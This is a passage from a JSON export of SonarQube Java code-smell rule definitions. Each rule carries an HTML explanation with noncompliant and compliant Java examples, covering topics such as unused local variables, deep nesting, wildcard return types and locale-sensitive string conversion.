Collections</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/generics/rawTypes.html\">Oracle - The Javaâ¢ Tutorials - Raw Types</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-generics\">Baeldung - The Basics of Java Generics</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1596","summary":"\"Collections.EMPTY_LIST\", \"EMPTY_MAP\", and \"EMPTY_SET\" should not be used","tags":["obsolete","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The cyclomatic complexity of methods should not exceed a defined threshold.</p>\n<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>\n<h3>Exceptions</h3>\n<p>While having a large number of fields in a class may indicate that it should be split, this rule nonetheless ignores high complexity in\n<code>equals</code> and <code>hashCode</code> methods.</p>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1541","summary":"Methods should not be too complex","tags":["architecture","brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Declaring a variable only to immediately return or throw it is considered a bad practice because it adds unnecessary complexity to the code. This\npractice can make the code harder to read and understand, as it introduces an extra step that doesnât add any value. Instead of declaring a variable\nand then immediately returning or throwing it, it is generally better to return or throw the value directly. This makes the code cleaner, simpler, and\neasier to understand.</p>\n<h2>How to fix it</h2>\n<p>Declaring a variable only to immediately return or throw it is considered a bad practice because it adds unnecessary complexity to the code. To fix\nthe issue, return or throw the value directly.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic long computeDurationInMilliseconds() {\n  long duration = (((hours * 60) + minutes) * 60 + seconds) * 1000;\n  return duration;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic long computeDurationInMilliseconds() {\n  return (((hours * 60) + minutes) * 60 + seconds) * 1000;\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic void doSomething() {\n  RuntimeException myException = new RuntimeException();\n  throw myException;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic void doSomething() {\n  throw new RuntimeException();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1488","summary":"Local variables should not be declared and then immediately returned or thrown","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>An unused local variable is a variable that has been declared but is not used anywhere in the block of code where it is defined. It is dead code,\ncontributing to unnecessary complexity and leading to confusion when reading the code. Therefore, it should be removed from your code to maintain\nclarity and efficiency.</p>\n<h3>What is the potential impact?</h3>\n<p>Having unused local variables in your code can lead to several issues:</p>\n<ul>\n  <li> <strong>Decreased Readability</strong>: Unused variables can make your code more difficult to read. They add extra lines and complexity, which\n  can distract from the main logic of the code. </li>\n  <li> <strong>Misunderstanding</strong>: When other developers read your code, they may wonder why a variable is declared but not used. This can lead\n  to confusion and misinterpretation of the codeâs intent. </li>\n  <li> <strong>Potential for Bugs</strong>: If a variable is declared but not used, it might indicate a bug or incomplete code. For example, if you\n  declared a variable intending to use it in a calculation, but then forgot to do so, your program might not work as expected. </li>\n  <li> <strong>Maintenance Issues</strong>: Unused variables can make code maintenance more difficult. If a programmer sees an unused variable, they\n  might think it is a mistake and try to 'fix' the code, potentially introducing new bugs. </li>\n  <li> <strong>Memory Usage</strong>: Although modern compilers are smart enough to ignore unused variables, not all compilers do this. In such cases,\n  unused variables take up memory space, leading to inefficient use of resources. </li>\n</ul>\n<p>In summary, unused local variables can make your code less readable, more confusing, and harder to maintain, and they can potentially lead to bugs\nor inefficient memory use. Therefore, it is best to remove them.</p>\n<h2>How to fix it</h2>\n<p>The fix for this issue is straightforward. Once you ensure the unused variable is not part of an incomplete implementation, you just need to remove\nit.</p>\n<p>Java 22 introduces the unnamed variable pattern <code>_</code>. When a variable declared within a pattern match, an enhanced for loop, or a try\nwith resource is unused, you should replace its name with the unnamed variable pattern to clearly indicate the intent not to use the variable.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic int numberOfMinutes(int hours) {\n  int seconds = 0;   // Noncompliant: \"seconds\" is unused\n  return hours * 60;\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic String name(Person p) {\n  return switch (p) {\n    case User(String name, int age) -&gt; name; // Noncompliant: \"age\" is unused replace it with the unnamed variable pattern (starting from Java 22)\n    default -&gt; throw new IllegalArgumentException();\n  };\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\npublic String type(Person p) {\n  return switch (p) {\n    case User user -&gt; \"user\"; // Noncompliant:  \"user\" is unused replace it with the unnamed variable pattern (starting from Java 22)\n    default -&gt; throw new IllegalArgumentException();\n  };\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\npublic int age(Person p) {\n  if (p instanceof User(String name, int age)) { // Noncompliant:  \"name\" is unused replace it with the unnamed variable pattern (starting from Java 22)\n    return age;\n  }\n}\n</pre>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\npublic static int count(int[] elements) {\n  int count = 0;\n  for (var el : elements) { // Noncompliant:  \"el\" is unused replace it with the unnamed variable pattern (starting from Java 22)\n    count++;\n  }\n  return count;\n}\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"noncompliant\">\npublic void foo() {\n  try (var file = Files.createTempFile(directory, \"temp\", \".txt\")) { // Noncompliant:  \"file\" is unused replace it with the unnamed variable pattern (starting from Java 22)\n    System.out.println(\"file created\");\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic int numberOfMinutes(int hours) {\n  return hours * 60;\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic String name(Person p) {\n  return switch (p) {\n    case User(String name, _) -&gt; name; // Compliant\n    default -&gt; throw new IllegalArgumentException();\n  };\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\npublic String type(Person p) {\n  return switch (p) {\n    case User _ -&gt; \"user\"; // Compliant\n    default -&gt; throw new IllegalArgumentException();\n  };\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\npublic int age(Person p) {\n  if (p instanceof User(String _, int age)) { // Compliant\n    return age;\n  }\n}\n</pre>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\npublic static int count(int[] elements) {\n  int count = 0;\n  for (var _ : elements) { // Compliant\n    count++;\n  }\n  return count;\n}\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"compliant\">\npublic void foo() {\n  try (var _ = Files.createTempFile(directory, \"temp\", \".txt\")) { // Compliant\n    System.out.println(\"file created\");\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-1481","summary":"Unused local variables should be removed","tags":["java22","unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map\nstructure would be more readable and maintainable, and should be used instead.</p>\n<h3>Exceptions</h3>\n<p>This rule ignores <code>switch</code>es over <code>Enum</code>s and empty, fall-through cases.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-1479","summary":"\"switch\" statements should not have too many \"case\" clauses","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>A return type containing wildcards cannot be narrowed down in any context. This indicates that the developerâs intention was likely something\nelse.</p>\n<p>The core problem lies in type variance. Expressions at an input position, such as arguments passed to a method, can have a more specific type than\nthe type expected by the method, which is called <em>covariance</em>. Expressions at an output position, such as a variable that receives the return\nresult from a method, can have a more general type than the methodâs return type, which is called <em>contravariance</em>. This can be traced back to\nthe Liskov substitution principle.</p>\n<p>In Java, type parameters of a generic type are invariant by default due to their potential occurrence in both input and output positions at the\nsame time. A classic example of this is the methods <code>T get()</code> (output position) and <code>add(T element)</code> (input position) in\ninterface <code>java.util.List</code>. We could construct cases with invalid typing in <code>List</code> if <code>T</code> were not invariant.</p>\n<p>Wildcards can be employed to achieve covariance or contravariance in situations where the type parameter appears in one position only:</p>\n<ul>\n  <li> <code>&lt;? extends Foo&gt;</code> for covariance (input positions) </li>\n  <li> <code>&lt;? super Foo&gt;</code> for contravariance (output positions) </li>\n</ul>\n<p>However, covariance is ineffective for the return type of a method since it is not an input position. Making it contravariant also has no effect\nsince it is the receiver of the return value which must be contravariant (use-site variance in Java). Consequently, a return type containing wildcards\nis generally a mistake.</p>\n<h2>How to fix it</h2>\n<p>The solution to this problem depends on the original intention of the developer. Given the examples:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nList&lt;? extends Animal&gt; getAnimals() { ... } // Noncompliant, wildcard with no use\nList&lt;? super Plant&gt; getLifeforms() { ... }  // Noncompliant, wildcard with no use\n</pre>\n<p>You can remove the wildcards to make the types invariant:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nList&lt;Animal&gt; getAnimals() { ... }           // Compliant, using invariant type instead\nList&lt;Plant&gt; getLifeforms() { ... }          // Compliant, using invariant type instead\n</pre>\n<p>Or replace them with a super- or subtypes (still invariant):</p>\n<pre>\nList&lt;Dog&gt; getAnimals() { ... }              // Compliant, using subtype instead\nList&lt;Lifeform&gt; getLifeforms() { ... }       // Compliant, using supertype instead\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/extra/generics/wildcards.html\">The Javaâ¢ Tutorials - Wildcards</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://medium.com/javarevisited/variance-in-java-and-scala-63af925d21dc\">Sinisa Louc - A Complete Guide to Variance in Java and\n  Scala</a> </li>\n  <li> <a href=\"https://web.archive.org/web/20240206045705/https://kotlinexpertise.com/kotlin-generics-and-variance-vs-java/\">Kotlin Expertise Blog -\n  Kotlin Generics and Variance (Compared to Java)</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Covariance_and_contravariance_(computer_science)\">Wikipedia - Covariance and contravariance (computer\n  science)</a> </li>\n  <li> <a href=\"https://schneide.blog/2015/05/11/declaration-site-and-use-site-variance-explained/\">Schneide Blog - Declaration-site and use-site\n  variance explained</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Liskov_substitution_principle\">Wikipedia - Liskov substitution principle</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1452","summary":"Generic wildcard types should not be used in return types","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application.</p>\n<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>\n<h3>Compliant solution</h3>\n<pre>\n/*\n * SonarQube, open source software quality management tool.\n * Copyright (C) 2008-2013 SonarSource\n * mailto:contact AT sonarsource DOT com\n *\n * SonarQube is free software; you can redistribute it and/or\n * modify it under the terms of the GNU Lesser General Public\n * License as published by the Free Software Foundation; either\n * version 3 of the License, or (at your option) any later version.\n *\n * SonarQube is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with this program; if not, write to the Free Software Foundation,\n * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n */\n</pre>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1451","summary":"Track lack of copyright and license headers","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LAWFUL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When the value of a private field is always assigned to in a class' methods before being read, then it is not being used to store class\ninformation. Therefore, it should become a local variable in the relevant methods to prevent any misunderstanding.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Foo {\n  private int a;\n  private int b;\n\n  public void doSomething(int y) {\n    a = y + 5;\n    ...\n    if(a == 0) {\n      ...\n    }\n    ...\n  }\n\n  public void doSomethingElse(int y) {\n    b = y + 3;\n    ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Foo {\n\n  public void doSomething(int y) {\n    int a = y + 5;\n    ...\n    if(a == 0) {\n      ...\n    }\n  }\n\n  public void doSomethingElse(int y) {\n    int b = y + 3;\n    ...\n  }\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule doesnât raise any issue on annotated field.</p>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-1450","summary":"Private fields only used as local variables in methods should become local variables","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Failure to specify a locale when calling the methods <code>toLowerCase()</code>, <code>toUpperCase()</code> or <code>format()</code> on\n<code>String</code> objects means the system default encoding will be used, possibly creating problems with international characters or number\nrepresentations. For instance with the Turkish language, when converting the small letter 'i' to upper case, the result is capital letter 'I' with a\ndot over it.</p>\n<p>Case conversion without a locale may work fine in its \"home\" environment, but break in ways that are extremely difficult to diagnose for customers\nwho use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when itâs time to fix them. For locale-sensitive\nstrings, the correct locale should always be used, but <code>Locale.ROOT</code> can be used for case-insensitive ones.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nmyString.toLowerCase()\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nmyString.toLowerCase(Locale.TR)\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4zdGBQ\">CERT, STR02-J.</a> - Specify an appropriate locale when comparing locale-dependent data\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1449","summary":"String operations should not rely on the default system locale","tags":["unpredictable","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.\nAbove a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"infeasible","ruleKey":"RSPEC-1448","summary":"Classes should not have too many methods","tags":["architecture","brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>There is no good reason to declare a field \"public\" and \"static\" without also declaring it \"final\". Most of the time this is a kludge to share a\nstate among several objects. But with this approach, any object can do whatever it wants with the shared state, such as setting it to\n<code>null</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Greeter {\n  public static Foo foo = new Foo();\n  ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Greeter {\n  public static final Foo FOO = new Foo();\n  ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/500\">CWE-500 - Public Static Field Not Marked Final</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/WjdGBQ\">CERT OBJ10-J.</a> - Do not use public static nonfinal fields </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1444","summary":"\"public static\" fields should be constant","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be\nreally readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of\nthe code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.\nComments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint a1 = b + c; // This is a trailing comment that can be very very long\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n// This very long comment is better placed before the line of code\nint a2 = b + c;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-139","summary":"Comments should not be located at the end of lines of code","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A method that grows too large tends to aggregate too many responsibilities. Such method inevitably become harder to understand and therefore harder\nto maintain.</p>\n<p>Above a specific threshold, it is strongly advised to refactor into smaller methods which focus on well-defined tasks. Those smaller methods will\nnot only be easier to understand, but also probably easier to test.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-138","summary":"Methods should not have too many lines","tags":["architecture","brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The use of <code>break</code> and <code>continue</code> statements increases the complexity of the control flow and makes it harder to understand\nthe program logic. In order to keep a good program structure, they should not be applied more than once per loop.</p>\n<p>This rule reports an issue when there is more than one <code>break</code> or <code>continue</code> statement in a loop. The code should be\nrefactored to increase readability if there is more than one.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfor (int i = 1; i &lt;= 10; i++) {     // Noncompliant; two \"continue\" statements\n  if (i % 2 == 0) {\n    continue;\n  }\n\n  if (i % 3 == 0) {\n    continue;\n  }\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfor (int i = 1; i &lt;= 10; i++) {\n  if (i % 2 == 0 || i % 3 == 0) {\n    continue;\n  }\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se20/html/jls-14.html#jls-14.7\">Oracle - Labeled Statements</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://softwareengineering.stackexchange.com/questions/185944/java-labels-to-be-or-not-to-be/185945\">StackExchange - Java labels. To\n  be or not to be</a> </li>\n  <li> <a href=\"https://stackoverflow.com/questions/33689466/labels-in-java-bad-practice\">StackOverflow - Labels in Java - bad practice?</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-135","summary":"Loops should not contain more than a single \"break\" or \"continue\" statement","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Nested control flow statements such as <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> are often\nkey ingredients in creating whatâs known as \"Spaghetti code\". This code smell can make your program difficult to understand and maintain.</p>\n<p>When numerous control structures are placed inside one another, the code becomes a tangled, complex web. This significantly reduces the codeâs\nreadability and maintainability, and it also complicates the testing process.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following example demonstrates the behavior of the rule with the default threshold of 3 levels of nesting and one of the potential ways to fix\nthe code smell by introducing guard clauses:</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nif (condition1) {                  // Compliant - depth = 1\n  /* ... */\n  if (condition2) {                // Compliant - depth = 2\n    /* ... */\n    for (int i = 0; i &lt; 10; i++) {  // Compliant - depth = 3\n      /* ... */\n      if (condition4) {            // Noncompliant - depth = 4, which exceeds the limit\n        if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4\n          /* ... */\n        }\n        return;\n      }\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nif (!condition1) {\n  return;\n}\n/* ... */\nif (!condition2) {\n  return;\n}\nfor (int i = 0; i &lt; 10; i++) {\n  /* ... */\n  if (condition4) {\n    if (condition5) {\n      /* ... */\n    }\n    return;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Guard_(computer_science)\">Guard clauses in programming</a> - one of the approaches to reducing the depth\n  of nesting </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-134","summary":"Control flow statements \"if\", \"for\", \"while\", \"switch\" and \"try\" should not be nested too deeply","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>This rule raises an issue when a collection implementation class from <code>java.util.*</code> is used:</p>\n<ul>\n  <li> as a return type of a <code>public</code> method. </li>\n  <li> as an argument type of a <code>public</code> method. </li>\n  <li> as the type of a <code>public</code> field. </li>\n</ul>\n<h2>Why is this an issue?</h2>\n<p>The Java Collections API offers a well-structured hierarchy of interfaces designed to hide collection implementation details. For the various\ncollection data structures like lists, sets, and maps, specific interfaces (<code>java.util.List</code>, <code>java.util.Set</code>,\n<code>java.util.Map</code>) cover the essential features.</p>\n<p>When passing collections as method parameters, return values, or when exposing fields, it is generally recommended to use these interfaces instead\nof the implementing classes. The implementing classes, such as <code>java.util.LinkedList</code>, <code>java.util.ArrayList</code>, and\n<code>java.util.HasMap</code>, should only be used for collection instantiation. They provide finer control over the performance characteristics of\nthose structures, and developers choose them depending on their use case.</p>\n<p>For example, if fast random element access is essential, <code>java.util.ArrayList</code> should be instantiated. If inserting elements at a random\nposition into a list is crucial, a <code>java.util.LinkedList</code> should be preferred. However, this is an implementation detail your API should\nnot expose.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Employees {\n  public final HashSet&lt;Employee&gt; employees   // Noncompliant, field type should be \"Set\"\n    = new HashSet&lt;Employee&gt;();\n\n  public HashSet&lt;Employee&gt; getEmployees() {  // Noncompliant, return type should be \"Set\"\n    return employees;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Employees {\n  public final Set&lt;Employee&gt; employees       // Compliant\n    = new HashSet&lt;Employee&gt;();\n\n  public Set&lt;Employee&gt; getEmployees() {      // Compliant\n    return employees;\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1319","summary":"Declarations should use Java collection interfaces such as \"List\" rather than specific implementation classes such as \"LinkedList\"","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule raises an issue when the <code>StringBuilder</code> or <code>StringBuffer</code> constructor is called with a single character as an\nargument.</p>\n<h2>Why is this an issue?</h2>\n<p>When a developer uses the <code>StringBuilder</code> or <code>StringBuffer</code> constructor with a single character as an argument, the likely\nintention is to create an instance with the character as the initial string value.</p>\n<p>However, this is not what happens because of the absence of a dedicated <code>StringBuilder(char)</code> or <code>StringBuffer(char)</code>\nconstructor. Instead, <code>StringBuilder(int)</code> or <code>StringBuffer(int)</code> is invoked, which results in an instance with the provided\n<code>int</code> value as the initial capacity of the <code>StringBuilder</code> or <code>StringBuffer</code>.</p>\n<p>The reason behind this behavior lies in the automatic widening of <code>char</code> expressions to <code>int</code> when required. Consequently,\nthe UTF-16 code point value of the character (for example, <code>65</code> for the character <code>'A'</code>) is interpreted as an <code>int</code>\nto specify the initial capacity.</p>\n<h2>How to fix it</h2>\n<p>If the argument is a <code>char</code> literal, use a string literal instead:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nStringBuffer foo = new StringBuffer('x'); // Noncompliant, replace with String\n</pre>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nStringBuffer foo = new StringBuffer(\"x\"); // Compliant\n</pre>\n<p>If the argument is it is a non-literal <code>char</code> expression, convert it to <code>String</code> using the <code>String.valueOf()</code>\nmethod:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nStringBuffer foo(char firstChar) {\n  return new StringBuffer(firstChar);                 // Noncompliant\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nStringBuffer foo(char firstChar) {\n  return new StringBuffer(String.valueOf(firstChar)); // Compliant\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se10/html/jls-5.html#jls-5.1.2\">Oracle - Java Language Specification, section 5.1.2. Widening\n  Primitive Conversion</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.w3schools.com/java/java_type_casting.asp\">W3schools - Java Type Casting</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1317","summary":"\"StringBuilder\" and \"StringBuffer\" should not be instantiated with a character ","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>This rule allows you to track the use of the Checkstyle suppression comment mechanism.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n// CHECKSTYLE:OFF\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1315","summary":"Track uses of \"CHECKSTYLE:OFF\" suppression 